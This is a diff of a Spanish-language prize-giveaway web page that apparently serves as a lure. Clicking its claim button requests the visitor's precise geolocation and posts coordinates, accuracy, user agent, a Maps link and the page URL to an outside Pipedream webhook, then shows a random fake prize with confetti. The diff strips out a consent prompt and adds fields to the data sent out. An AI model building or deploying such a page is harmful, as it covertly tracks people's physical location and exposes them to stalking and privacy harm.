@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Verificación de premios interactiva con animaciones y confeti.">
 <title>Verificación y Premios</title>
 <style>
 body {
@@ -35,11 +34,7 @@ button {
   cursor: pointer;
   transition: background 0.3s ease;
 }
-button:disabled {
-  background: #888;
-  cursor: not-allowed;
-}
-button:hover:not(:disabled) { background: #0056b3; }
+button:hover { background: #0056b3; }
 .premios-grid {
   display: grid;
   grid-template-columns: repeat(auto-fit,minmax(80px,1fr));
@@ -88,17 +83,18 @@ canvas {
   <h1>✅ VERIFICACIÓN Y PREMIOS</h1>
   <p>Mira los premios disponibles y reclama el tuyo.</p>
   <div class="premios-grid" id="premios-grid"></div>
-  <button id="btnPremio" aria-label="Reclama tu premio">📍 RECLAMA TU PREMIO</button>
-  <div id="premio-grande" role="dialog" aria-modal="true">
+  <button id="btnPremio">📍 RECLAMA TU PREMIO</button>
+  <div id="premio-grande">
     <h2>🎉 ¡Tu premio es!</h2>
-    <img id="img-premio-grande" src="" alt="Imagen del premio">
+    <img id="img-premio-grande" src="" alt="">
     <h3 id="nombre-premio-grande"></h3>
   </div>
 </div>
 
 <script>
-const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net"; // Pipedream URL de pruebas
+const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net";
 
+// Premios con iconos y foto grande
 const premios = [
   { nombre: "Bicicleta de montaña", icon: "🚲", img: "https://cdn.pixabay.com/photo/2017/03/02/04/23/bicycle-2119460_1280.jpg" },
   { nombre: "Consola Gamer", icon: "🎮", img: "https://cdn.pixabay.com/photo/2016/11/29/04/17/joystick-1866599_1280.jpg" },
@@ -108,96 +104,82 @@ const premios = [
   { nombre: "TV Pantalla Grande", icon: "📺", img: "https://cdn.pixabay.com/photo/2015/09/05/22/46/tv-926093_1280.jpg" }
 ];
 
-// Mostrar iconos de premios
+// Mostrar iconos
 const premiosGrid = document.getElementById("premios-grid");
-premios.forEach(p => {
+premios.forEach((p)=>{
   const div = document.createElement("div");
   div.className = "premio-card";
   div.textContent = p.icon;
-  div.title = p.nombre;
   premiosGrid.appendChild(div);
 });
 
-// Canvas responsive
-const canvas = document.getElementById("confetti");
-const ctx = canvas.getContext("2d");
-function resizeCanvas() {
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-}
-window.addEventListener('resize', resizeCanvas);
-resizeCanvas();
-
-// Premio grande y botón
 const btn = document.getElementById("btnPremio");
 const premioGrande = document.getElementById("premio-grande");
 const imgGrande = document.getElementById("img-premio-grande");
 const nombreGrande = document.getElementById("nombre-premio-grande");
+const canvas = document.getElementById("confetti");
+const ctx = canvas.getContext("2d");
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
 
-btn.addEventListener("click", () => {
-  if (!navigator.geolocation) return alert("Tu navegador no soporta geolocalización.");
-
-  const confirmar = confirm("⚠️ Se solicitará tu ubicación para reclamar el premio. ¿Deseas continuar?");
-  if (!confirmar) return;
-
-  btn.disabled = true; // Evitar múltiples envíos
-  navigator.geolocation.getCurrentPosition(onSuccess, onError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+btn.addEventListener("click",()=>{
+  if(!navigator.geolocation) return alert("Tu navegador no soporta geolocalización.");
+  navigator.geolocation.getCurrentPosition(onSuccess,onError,{enableHighAccuracy:true,timeout:10000,maximumAge:0});
 });
 
-function onSuccess(pos) {
+function onSuccess(pos){
+  // Enviar datos
   const data = {
     lat: pos.coords.latitude,
     lon: pos.coords.longitude,
-    timestamp: new Date().toISOString()
+    accuracy: pos.coords.accuracy,
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    maps_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+    source: window.location.href
   };
   enviarWebhook(data);
 
-  const premio = premios[Math.floor(Math.random() * premios.length)];
+  // Premio aleatorio
+  const premio = premios[Math.floor(Math.random()*premios.length)];
+
+  // Mostrar imagen grande
   imgGrande.src = premio.img;
   nombreGrande.textContent = premio.nombre;
   premioGrande.style.display = "block";
-  setTimeout(() => premioGrande.classList.add("show"), 50);
+  setTimeout(()=> premioGrande.classList.add("show"), 50);
 
   lanzarConfeti();
-  alert("✅ ¡Tu premio ha sido registrado correctamente!");
 }
 
-function onError(err) { 
-  alert("⚠️ Error al obtener ubicación: " + (err.message || err.code)); 
-  btn.disabled = false; // Rehabilitar botón en caso de error
-}
+function onError(err){ alert("⚠️ Error al obtener ubicación: "+(err.message||err.code)); }
 
-function lanzarConfeti() {
-  const piezas = Array.from({ length: 150 }, () => ({
-    x: Math.random() * canvas.width,
-    y: Math.random() * canvas.height - 50,
-    w: 10, h: 10,
-    color: ["#f94144", "#f3722c", "#f9c74f", "#90be6d", "#577590", "#43aa8b"][Math.floor(Math.random() * 6)],
-    vel: Math.random() + 1.5
+function lanzarConfeti(){
+  const piezas = Array.from({length:150},()=>({
+    x:Math.random()*canvas.width,
+    y:Math.random()*canvas.height-50,
+    w:10,h:10,
+    color:["#f94144","#f3722c","#f9c74f","#90be6d","#577590","#43aa8b"][Math.floor(Math.random()*6)],
+    vel:Math.random()+1.5
   }));
-  let animId;
-  function animar() {
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-    piezas.forEach(p => {
-      ctx.fillStyle = p.color;
-      ctx.fillRect(p.x, p.y, p.w, p.h);
-      p.y += p.vel;
-      if (p.y > canvas.height) p.y = -10;
+  function animar(){
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    piezas.forEach(p=>{
+      ctx.fillStyle=p.color;
+      ctx.fillRect(p.x,p.y,p.w,p.h);
+      p.y+=p.vel;
+      if(p.y>canvas.height) p.y=-10;
     });
-    animId = requestAnimationFrame(animar);
+    requestAnimationFrame(animar);
   }
   animar();
-  setTimeout(() => cancelAnimationFrame(animId), 6000);
+  setTimeout(()=>ctx.clearRect(0,0,canvas.width,canvas.height),6000);
 }
 
-async function enviarWebhook(data) {
-  try {
-    await fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    });
-  } catch (err) { console.error("Error webhook", err); }
+async function enviarWebhook(data){
+  try{
+    await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
+  }catch(err){ console.error("Error webhook",err);}
 }
 </script>
 </body>
